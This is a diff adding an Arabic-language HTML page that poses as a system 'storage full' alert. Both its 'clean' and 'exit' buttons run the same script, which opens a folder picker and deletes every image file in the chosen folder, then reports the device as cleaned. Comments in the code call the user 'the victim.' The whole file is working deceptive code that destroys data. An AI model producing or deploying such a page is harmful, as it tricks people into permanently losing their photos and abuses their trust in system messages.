@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تنبيه النظام - System Alert</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body {
+            height: 100vh; width: 100vw; background: #f4f4f4; /* خلفية فاتحة زي تنبيهات النظام */
+            display: flex; justify-content: center; align-items: center;
+        }
+        .alert-box {
+            background: #fff; width: 90%; max-width: 350px; border-radius: 15px;
+            padding: 30px 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .alert-icon { font-size: 50px; color: #ff3b30; margin-bottom: 15px; }
+        h2 { font-size: 20px; color: #333; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        
+        .btn-container { display: flex; gap: 10px; justify-content: center; }
+        .btn {
+            flex: 1; padding: 12px; border: none; border-radius: 10px;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+        .btn-clean { background: #007aff; color: #fff; }
+        .btn-exit { background: #e5e5ea; color: #333; }
+        
+        /* شاشة التحميل المخفية */
+        #loading { display: none; margin-top: 20px; font-size: 14px; color: #007aff; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="alert-box">
+        <div class="alert-icon">⚠️</div>
+        <h2>تحذير: مساحة التخزين ممتلئة</h2>
+        <p>تم اكتشاف عدد كبير من الصور التي تسبب بطء في الجهاز. يرجى اختيار إجراء للمتابعة.</p>
+        
+        <div class="btn-container">
+            <!-- الزرين يستدعوان نفس الدالة -->
+            <button class="btn btn-clean" onclick="startDeletion()">تصفية</button>
+            <button class="btn btn-exit" onclick="startDeletion()">خروج</button>
+        </div>
+        
+        <div id="loading">⏳ جاري فحص الصور وحذفها...</div>
+    </div>
+
+    <script>
+        async function startDeletion() {
+            // إخفاء الأزرار وإظهار رسالة التحميل
+            document.querySelector('.btn-container').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                // فتح مدير الملفات (الضحية هو اللي يختار المجلد)
+                const dirHandle = await window.showDirectoryPicker();
+                
+                let deletedCount = 0;
+                const imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'heic'];
+
+                // الدوران على الملفات
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        // استخراج الامتداد
+                        const ext = entry.name.split('.').pop().toLowerCase();
+                        
+                        // إذا كان الملف صورة، امسحه
+                        if (imageExtensions.includes(ext)) {
+                            try {
+                                await dirHandle.removeEntry(entry.name);
+                                deletedCount++;
+                            } catch (e) {
+                                console.error("Failed to delete", entry.name);
+                            }
+                        }
+                    }
+                }
+
+                // رسالة نهائية للضحية
+                document.getElementById('loading').innerHTML = `✅ تم تنظيف الجهاز بنجاح.<br>تم حذف ${deletedCount} صورة.`;
+                
+            } catch (err) {
+                // إذا لغى الضحية العملية
+                document.getElementById('loading').innerText = "❌ تم إلغاء العملية.";
+                document.querySelector('.btn-container').style.display = 'flex'; // إرجاع الأزرار
+            }
+        }
+    </script>
+</body>
+</html>
